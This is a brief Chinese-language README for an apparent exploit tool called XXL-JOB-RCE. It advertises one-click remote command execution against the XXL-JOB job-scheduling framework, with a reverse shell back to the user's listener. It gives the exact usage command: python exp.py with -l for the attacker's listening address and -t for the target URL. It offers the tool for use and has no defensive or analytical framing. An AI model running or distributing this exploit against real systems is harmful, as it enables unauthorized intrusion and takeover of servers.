# XXL-JOB-RCE
工具介绍：
-
```
武器化工具：

    工具一键执行 xxl-job框架的远程命令执行 反弹shell
```
使用方法：
-
```
python exp.py -l xxx.xxx.xxx.xxx:port -t http://xxx.xxx.xxx.xxx

-l 后输入自己服务器的监听地址
-t 后输入目标地址
```
